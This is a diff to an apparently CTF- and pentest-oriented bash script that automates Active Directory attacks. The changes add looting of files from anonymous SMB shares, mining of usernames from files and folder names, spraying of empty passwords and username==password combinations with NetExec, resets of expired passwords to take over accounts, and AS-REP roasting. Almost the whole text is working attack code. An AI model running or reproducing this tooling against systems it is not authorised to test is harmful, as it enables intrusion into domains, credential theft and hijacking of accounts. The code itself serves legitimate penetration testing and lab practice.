@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.36.1"
+readonly VERSION="1.37.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -698,7 +698,7 @@ phase_unauth() {
     subsection "Anonymous share looting — download readable files + harvest creds"
     local adl="$OUTDIR/shares_anon"; mkdir -p "$adl"
     $NXC smb "$DC_IP" -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=5242880 \
-        EXCLUDE_EXTS=ico,lnk,png,jpg,jpeg,gif,bmp,svg,ttf,otf,woff,woff2,eot,exe,dll,msi,sys EXCLUDE_FILTER=ipc\$ \
+        EXCLUDE_EXTS=ico,lnk,ini,db,dat,png,jpg,jpeg,gif,bmp,svg,ttf,otf,woff,woff2,eot,exe,dll,msi,sys,mui,cat EXCLUDE_FILTER=ipc$,Default,AppData,WinX,Cache,Crashpad,Packages,Temp,Roaming,desktop.ini,Microsoft \
         OUTPUT_FOLDER="$adl" 2>&1 | tail -15 | tee -a "$LOGFILE"
     if [[ -z "$(find "$adl" -type f ! -name '*.json' 2>/dev/null)" ]] && have smbclient; then
         info "nxc null-spider pulled nothing → falling back to smbclient recursive download"
@@ -722,14 +722,14 @@ phase_unauth() {
             detail "      ${C_BOLD}### ${_f#$adl/}${C_RESET}"
             sed 's/^/        /' "$_f" 2>/dev/null | head -25 | while IFS= read -r _l; do detail "$_l"; done
         done < <(find "$adl" -type f -size -20k \( -iname '*.txt' -o -iname '*.md' -o -iname '*.csv' -o -iname '*.ini' -o -iname '*.conf' -o -iname '*.cnf' -o -iname '*.xml' -o -iname '*.html' -o -iname '*.config' \) 2>/dev/null | head -12)
-        harvest_secrets "anon-shares" < <(find "$adl" -type f -size -200k ! -name '*.json' -exec cat {} + 2>/dev/null)
+        harvest_secrets "anon-shares" < <(find "$adl" -type f -size -200k ! -name '*.json' ! -ipath '*/AppData/*' ! -ipath '*/Default/*' ! -iname 'desktop.ini' ! -iname '*.ini' -exec cat {} + 2>/dev/null)
         # Usernames live in these files too (the foothold account is NOT known in
         # advance -- it's whoever the spray flags). Mine candidate usernames from the
         # content (emails + first.last) so they get merged into users_all.txt and
         # sprayed, even if RID-brute missed them.
-        { find "$adl" -type f -size -200k ! -name '*.json' -exec cat {} + 2>/dev/null \
+        { find "$adl" -type f -size -200k ! -name '*.json' ! -ipath '*/AppData/*' ! -ipath '*/Default/*' -exec cat {} + 2>/dev/null \
             | grep -ohiE '[a-z][a-z0-9._-]*@[a-z0-9.-]+\.[a-z]{2,}' | sed 's/@.*//'
-          find "$adl" -type f -size -200k ! -name '*.json' -exec cat {} + 2>/dev/null \
+          find "$adl" -type f -size -200k ! -name '*.json' ! -ipath '*/AppData/*' ! -ipath '*/Default/*' -exec cat {} + 2>/dev/null \
             | grep -ohiE '\b[a-z]{2,}\.[a-z]{2,}\b' \
             | grep -viE '\.(txt|csv|ini|xml|conf|cnf|html?|md|log|exe|dll|doc|docx|pdf|htb|com|local|net|org|lan|corp)$'
         } 2>/dev/null | tr 'A-Z' 'a-z' | sort -u >>"$OUTDIR/users_anon.txt"
@@ -737,6 +737,29 @@ phase_unauth() {
             loot "$(grep -c . "$OUTDIR/users_anon.txt") candidate username(s) mined from share content -> users_anon.txt"; }
     else
         info "No files in anonymously-readable shares"
+    fi
+
+    # Usernames also hide as DIRECTORY NAMES in shares — per-user folders such as
+    # transfer/<user>/, home/<user>/, profiles\<user>. These dirs are frequently
+    # EMPTY (so the file download above pulls nothing), yet the folder name IS the AD
+    # username (first.last). This is exactly how Sendai leaks its users when RID-brute
+    # and RPC are denied. Mine them straight from a recursive share listing.
+    if have smbclient; then
+        local _dshl _ds
+        _dshl=$(smbclient -L "//$DC_IP" -N 2>/dev/null | awk '/Disk/{print $1}')
+        while IFS= read -r _ds; do
+            [[ -z "$_ds" ]] && continue
+            case "${_ds^^}" in ADMIN\$|C\$|IPC\$|PRINT\$|FAX\$|SYSVOL|NETLOGON) continue;; esac
+            smbclient "//$DC_IP/$_ds" -N -c "recurse ON; ls" 2>/dev/null \
+                | grep -E '[[:space:]]D[[:space:]]' | awk '{print $1}'
+        done < <(printf '%s\n' "$_dshl" | sort -u) \
+            | grep -oiE '^[a-z][a-z0-9-]+\.[a-z][a-z0-9-]+$' \
+            | grep -viE '^(temp|tmp|backup|public|default|all\.users|administrator)$' \
+            | tr 'A-Z' 'a-z' | sort -u >>"$OUTDIR/users_anon.txt"
+    fi
+    if [[ -s "$OUTDIR/users_anon.txt" ]]; then
+        sort -u -o "$OUTDIR/users_anon.txt" "$OUTDIR/users_anon.txt"
+        loot "$(grep -c . "$OUTDIR/users_anon.txt") candidate username(s) mined from share content + folder names → users_anon.txt"
     fi
 
     subsection "RID brute force (enumerate users without credentials)"
@@ -782,10 +805,12 @@ phase_unauth() {
                 info "Credentials supplied → skipping mass userenum (authenticated enum covers it)"
                 list=""
             else
-                # No creds at all: spray a capped username list to seed identities.
-                list="$OUTDIR/_userenum_seed.txt"
-                head -n 5000 "$USERLIST" 2>/dev/null >"$list"
-                info "No discovered users → seeding from top 5000 of $USERLIST"
+                # No discovered users (RID-brute/RPC are denied on hardened DCs like
+                # Server 2022): do NOT brute a 5000-username wordlist — it's noisy and
+                # rarely productive. We rely on share-mined names + the empty/userpass
+                # spray instead. Only userenum a list we actually have.
+                info "No discovered users (RID-brute/RPC denied) — skipping the 5000-username userenum brute"
+                list=""
             fi
         fi
         if [[ -n "$list" && -s "$list" ]]; then
@@ -835,11 +860,8 @@ phase_asreproast() {
         if [[ -s "$OUTDIR/users_all.txt" ]]; then
             userfile="$OUTDIR/users_all.txt"
             subsection "Unauth roast against $(wc -l <"$userfile") discovered users"
-        elif [[ -z "$USER" && -z "$HASH" ]]; then
-            userfile="$OUTDIR/_asrep_seed.txt"; head -n 5000 "$USERLIST" 2>/dev/null >"$userfile"
-            subsection "No creds and no users → seeding from top 5000 usernames"
         else
-            info "Have credentials but no users yet → deferring AS-REP to the authenticated pass"
+            info "No discovered users → skipping AS-REP roast (no 5000-username brute)"
             return
         fi
         [[ ! -s "$userfile" ]] && { warn "No usable user source for AS-REP"; return; }
@@ -896,7 +918,10 @@ phase_timeroast() {
 # Expired / must-change password: with the known (old) plaintext we can set a
 # new one over kpasswd and use the account immediately — a real path, not a dead end.
 _change_expired_password() {
-    [[ -z "$PASS" ]] && return 1            # need current plaintext to change it
+    # An EMPTY old password is valid (anonymous must-change accounts left blank → the
+    # empty string IS the current plaintext). Only bail when we hold a hash but no
+    # plaintext (PtH context: kpasswd/changepasswd need plaintext, can't use the hash).
+    [[ -z "$PASS" && -n "$HASH" ]] && return 1
     local tool; tool=$(command -v changepasswd.py || command -v impacket-changepasswd) || return 1
     local newpw="$PIVOT_PW" host="${DC_FQDN:-$DC_IP}"
     warn "Password for '${USER}' is EXPIRED / must-change — resetting to regain access (the weak/known pw is the foothold on boxes like Sendai)"
@@ -4196,6 +4221,42 @@ _confirm_plain_cred() {
 # `… | while`. A pipe runs the loop in a SUBSHELL, so queue_cred would mutate a
 # throwaway CRED_QUEUE and the new identities would never get pivoted. Keeping
 # the loop in the parent shell is what makes the recursive pivot actually work.
+# Anonymous seeding spray: try the EMPTY password and username==password across a
+# user list. A classic unauthenticated foothold (accounts left blank, must-change
+# accounts that still authenticate with the blank/old password). Valid hits AND
+# must-change hits are queued so the assessment pivots / resets them (for a blank
+# must-change account the empty string IS the old password → _change_expired_password
+# resets it). Nothing is hard-coded — the foothold is whichever user the DC accepts.
+_seed_anon_weak_spray() {
+    local ul="$1"; [[ -s "$ul" ]] || return
+    local mode out line u pw lbl nusers; nusers=$(grep -c . "$ul")
+    for mode in empty userpass; do
+        if [[ "$mode" == empty ]]; then
+            lbl="empty password"
+            subsection "Empty-password spray × $nusers users"
+            run "$NXC smb $DC_IP -u <users> -p '' --continue-on-success"
+            out=$($NXC smb "$DC_IP" -u "$ul" -p '' --continue-on-success 2>&1)
+        else
+            lbl="password==username"
+            subsection "username==password spray × $nusers users"
+            run "$NXC smb $DC_IP -u <users> -p <users> --no-bruteforce --continue-on-success"
+            out=$($NXC smb "$DC_IP" -u "$ul" -p "$ul" --no-bruteforce --continue-on-success 2>&1)
+        fi
+        printf '%s\n' "$out" >>"$LOGFILE"
+        while IFS= read -r line; do
+            u=$(grep -oP '\\\K[^\\:]+(?=:)' <<<"$line" | head -1); [[ -z "$u" ]] && continue
+            pw=""; [[ "$mode" == userpass ]] && pw="$u"
+            if grep -qi 'STATUS_PASSWORD_MUST_CHANGE' <<<"$line"; then
+                loot "★ ${C_GREEN}${u}${C_RESET} — $lbl accepted but MUST-CHANGE → reset on pivot"
+                queue_cred "$u" "$pw" "" "anon spray ($mode, must-change)"
+            else
+                loot "★ ${C_GREEN}${u} : ${pw:-<empty>}${C_RESET} — valid ($lbl)"
+                queue_cred "$u" "$pw" "" "anon spray ($mode)"
+            fi
+        done < <(grep -iE '\[\+\]|STATUS_PASSWORD_MUST_CHANGE' <<<"$out")
+    done
+}
+
 _spray_one() {
     local pw="$1" u line
     if _kerbrute_ok; then
@@ -6045,17 +6106,31 @@ main() {
             else queue_cred "$cu" "$cs" ""; [[ -n "$cs" ]] && add_secret "$cs"; fi
         done <"$CREDS_FILE"
     fi
-    # Anonymous start with no foothold yet but passwords harvested (e.g. from
-    # anonymous shares): spray them across the enumerated users to seed the first
-    # identity (incl. must-change accounts → reset) before draining the queue.
+    # Anonymous start with no foothold yet. Rebuild the user list from EVERY source
+    # (RID-brute, rpcclient, anon-share file content + folder names, …) so any seeding
+    # spray covers them all — the foothold user is whoever a spray flags, never a
+    # hard-coded name.
+    if [[ ${#CRED_QUEUE[@]} -eq 0 && -z "$USER" && -z "$HASH" ]]; then
+        cat "$OUTDIR"/users_*.txt 2>/dev/null | sort -u >"$OUTDIR/users_all.txt"
+        # Prefer the kerbrute-confirmed list when we have one (drops share folders that
+        # aren't real users); else spray every mined candidate.
+        local _seed_ul="$OUTDIR/users_all.txt"
+        [[ -s "$OUTDIR/users_valid.txt" ]] && _seed_ul="$OUTDIR/users_valid.txt"
+        if [[ -s "$_seed_ul" ]]; then
+            # (1) ALWAYS try the empty password + username==password — a cheap classic
+            #     anonymous foothold that needs no harvested secret.
+            section "SEEDING · empty / username=password spray × enumerated users (anonymous)"
+            _seed_anon_weak_spray "$_seed_ul"
+        else
+            warn "No users enumerated (RID-brute/RPC denied, no share-mined names) — pass --users-file <list> to seed the spray"
+        fi
+    fi
+    # (2) If we harvested any passwords (e.g. from anon shares), spray those too.
     if [[ ${#CRED_QUEUE[@]} -eq 0 && ${#FOUND_SECRETS[@]} -gt 0 ]]; then
-        # Rebuild the user list from EVERY source (RID-brute, rpcclient, anon-share
-        # mined names, …) so the spray covers them all — the foothold user is
-        # whichever one the spray flags, not a hard-coded name.
         cat "$OUTDIR"/users_*.txt 2>/dev/null | sort -u >"$OUTDIR/users_all.txt"
         if [[ -s "$OUTDIR/users_all.txt" ]]; then
             section "SEEDING · spray harvested passwords × enumerated users (no foothold yet)"
-            info "Spraying $(grep -c . "$OUTDIR/users_all.txt") users (RID-brute + rpc + share-mined) with $(echo ${#FOUND_SECRETS[@]}) harvested password(s)"
+            info "Spraying $(grep -c . "$OUTDIR/users_all.txt") users (RID-brute + rpc + share-mined) with ${#FOUND_SECRETS[@]} harvested password(s)"
             phase_password_spray
         fi
     fi
